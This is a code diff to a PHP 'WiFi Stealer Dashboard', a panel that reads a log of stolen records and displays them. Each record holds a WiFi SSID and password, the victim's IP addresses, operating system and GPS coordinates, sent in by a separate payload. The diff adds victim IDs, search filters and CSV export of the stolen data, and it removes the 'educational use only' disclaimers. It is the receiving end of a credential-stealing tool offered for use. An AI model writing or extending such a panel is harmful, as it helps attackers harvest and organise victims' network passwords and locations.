@@ -1,6 +1,4 @@
 <?php
-// WiFi Stealer Dashboard (full updated version)
-// DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
 
 date_default_timezone_set('Asia/Kolkata');
 
@@ -11,15 +9,16 @@ $logFile = __DIR__ . '/wifi_creds.log';
  *
  * CSV order (your payload must match):
  *  0: Timestamp
- *  1: SSID
- *  2: Password
- *  3: Victim LAN IP
- *  4: Victim OS
- *  5: Public IP
- *  6: LAN IP extra detail
- *  7: Latitude
- *  8: Longitude
- *  9: Packet summary
+ *  1: Victim ID
+ *  2: SSID
+ *  3: Password
+ *  4: Victim LAN IP
+ *  5: Victim OS
+ *  6: Public IP
+ *  7: LAN IP extra detail
+ *  8: Latitude
+ *  9: Longitude
+ * 10: Packet summary
  */
 function parse_capture_line($line)
 {
@@ -33,16 +32,17 @@ function parse_capture_line($line)
         return null;
     }
 
-    $timeStr       = trim($fields[0] ?? '');
-    $ssid          = trim($fields[1] ?? '');
-    $pass          = trim($fields[2] ?? '');
-    $victimLanIp   = trim($fields[3] ?? '');
-    $victimOs      = trim($fields[4] ?? '');
-    $publicIp      = trim($fields[5] ?? '');
-    $lanIpExtra    = trim($fields[6] ?? '');
-    $latitude      = trim($fields[7] ?? '');
-    $longitude     = trim($fields[8] ?? '');
-    $pktSummary    = trim($fields[9] ?? '');
+    $timeStr     = trim($fields[0] ?? '');
+    $victimId    = trim($fields[1] ?? '');
+    $ssid        = trim($fields[2] ?? '');
+    $pass        = trim($fields[3] ?? '');
+    $victimLanIp = trim($fields[4] ?? '');
+    $victimOs    = trim($fields[5] ?? '');
+    $publicIp    = trim($fields[6] ?? '');
+    $lanIpExtra  = trim($fields[7] ?? '');
+    $latitude    = trim($fields[8] ?? '');
+    $longitude   = trim($fields[9] ?? '');
+    $pktSummary  = trim($fields[10] ?? '');
 
     // Filter out header/garbage rows
     $badSsids = ['profile_name', 'ssid', 'SSID', 'IP', 'OS', 'Pass', 'password'];
@@ -54,14 +54,15 @@ function parse_capture_line($line)
         $pass = '(Not Found)';
     }
 
-    $timestamp   = $timeStr !== '' ? $timeStr : 'unknown';
-    $passLength  = strlen($pass);
-    $allLetters  = ($pass !== '' && ctype_alpha($pass));
-    $allNumbers  = ($pass !== '' && ctype_digit($pass));
+    $timestamp    = $timeStr !== '' ? $timeStr : 'unknown';
+    $passLength   = strlen($pass);
+    $allLetters   = ($pass !== '' && ctype_alpha($pass));
+    $allNumbers   = ($pass !== '' && ctype_digit($pass));
     $weakPassword = ($passLength < 8 || $allLetters || $allNumbers);
 
     return [
         'time'         => $timestamp,
+        'victim_id'    => $victimId !== '' ? $victimId : 'unknown',
         'ssid'         => $ssid,
         'password'     => $pass,
         'len'          => $passLength,
@@ -120,6 +121,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
         }
         $records[] = [
             $entry['time'],
+            $entry['victim_id'],
             $entry['ssid'],
             $entry['password'],
             $entry['ip_main'],
@@ -143,6 +145,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'export_csv') {
 
     fputcsv($fp, [
         'Time',
+        'Victim ID',
         'SSID',
         'Password',
         'Victim LAN IP',
@@ -267,10 +270,36 @@ $uniqueIPs       = count($ipCount);
 $avgPasswordLen  = $totalCaptures > 0 ? round($totalPasswordLength / $totalCaptures, 1) : 0;
 $weakPercentage  = $totalCaptures > 0 ? round(($weakPasswords / $totalCaptures) * 100, 1) : 0.0;
 
-// --- 7. Build JS data for details view ---
-$jsDetails = [];
+// --- 7. Filters from query ---
+$filter_ssid    = isset($_GET['ssid'])  ? trim($_GET['ssid'])  : '';
+$filter_ip      = isset($_GET['ip'])    ? trim($_GET['ip'])    : '';
+$filter_os_f    = isset($_GET['os'])    ? trim($_GET['os'])    : '';
+$filter_victim  = isset($_GET['vid'])   ? trim($_GET['vid'])   : '';
+
+$filteredEntries = [];
 foreach ($captureEntries as $entry) {
+    if ($filter_ssid !== '' && stripos($entry['ssid'], $filter_ssid) === false) {
+        continue;
+    }
+    if ($filter_ip !== '' &&
+        stripos($entry['ip_main'], $filter_ip) === false &&
+        stripos($entry['public_ip'], $filter_ip) === false) {
+        continue;
+    }
+    if ($filter_os_f !== '' && stripos($entry['os'], $filter_os_f) === false) {
+        continue;
+    }
+    if ($filter_victim !== '' && stripos($entry['victim_id'], $filter_victim) === false) {
+        continue;
+    }
+    $filteredEntries[] = $entry;
+}
+
+// --- 8. Build JS data for details view ---
+$jsDetails = [];
+foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
+        'victim_id'    => $entry['victim_id'],
         'ip_main'      => $entry['ip_main'],
         'lan_ip_extra' => $entry['lan_ip_extra'],
         'public_ip'    => $entry['public_ip'],
@@ -281,7 +310,7 @@ foreach ($captureEntries as $entry) {
     ];
 }
 
-// --- 8. View mode (kept for future use, but table now uses basic columns always) ---
+// viewMode kept for potential future use
 $viewMode = 'basic';
 ?>
 <!DOCTYPE html>
@@ -519,6 +548,7 @@ $viewMode = 'basic';
             title.textContent = 'Details of capture #' + (idx + 1);
 
             var html = '';
+            html += '<div><strong>Victim ID:</strong> ' + row.victim_id + '</div>';
             html += '<div><strong>Victim LAN IP:</strong> ' + row.ip_main + '</div>';
             html += '<div><strong>LAN extra:</strong> ' + row.lan_ip_extra + '</div>';
             html += '<div><strong>Public IP:</strong> ' + row.public_ip + '</div>';
@@ -579,6 +609,26 @@ $viewMode = 'basic';
         </div>
     <?php endif; ?>
 
+    <!-- FILTERS -->
+    <div class="card">
+        <form method="get" style="display:flex; flex-wrap:wrap; gap:8px; align-items:center; margin-bottom:4px;">
+            <input type="text" name="vid" placeholder="Filter Victim ID"
+                   value="<?php echo h($filter_victim); ?>"
+                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
+            <input type="text" name="ssid" placeholder="Filter SSID"
+                   value="<?php echo h($filter_ssid); ?>"
+                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
+            <input type="text" name="ip" placeholder="Filter IP (LAN/Public)"
+                   value="<?php echo h($filter_ip); ?>"
+                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
+            <input type="text" name="os" placeholder="Filter OS"
+                   value="<?php echo h($filter_os_f); ?>"
+                   style="padding:4px 8px; font-size:12px; border-radius:6px; border:1px solid #4b5563; background:#020617; color:#e5e7eb;">
+            <button type="submit" class="btn btn-sm">Apply filters</button>
+            <a href="<?php echo h($_SERVER['PHP_SELF']); ?>" class="btn btn-sm">Clear</a>
+        </form>
+    </div>
+
     <div class="stats-grid">
         <div class="stat-card">
             <div class="stat-label">Total captures</div>
@@ -608,6 +658,7 @@ $viewMode = 'basic';
             <thead>
             <tr>
                 <th>#</th>
+                <th>Victim</th>
                 <th>Time</th>
                 <th>SSID</th>
                 <th>Password</th>
@@ -617,16 +668,17 @@ $viewMode = 'basic';
             </tr>
             </thead>
             <tbody>
-            <?php if (empty($captureEntries)): ?>
+            <?php if (empty($filteredEntries)): ?>
                 <tr>
-                    <td colspan="7" style="text-align:center; padding:12px; color:#9ca3af;">
+                    <td colspan="8" style="text-align:center; padding:12px; color:#9ca3af;">
                         No captures yet.
                     </td>
                 </tr>
             <?php else: ?>
-                <?php foreach ($captureEntries as $entry): ?>
+                <?php foreach ($filteredEntries as $entry): ?>
                     <tr>
                         <td><?php echo h($entry['idx'] + 1); ?></td>
+                        <td><?php echo h($entry['victim_id']); ?></td>
                         <td><?php echo h($entry['time']); ?></td>
                         <td><?php echo h($entry['ssid']); ?></td>
                         <td class="password"><?php echo h($entry['password']); ?></td>
@@ -670,7 +722,7 @@ $viewMode = 'basic';
     </div>
 
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – Made By Zypher17 • Educational use only
+        © 2026 WiFi Stealer Dashboard – Made By Zypher17
     </div>
 </div>
 </body>
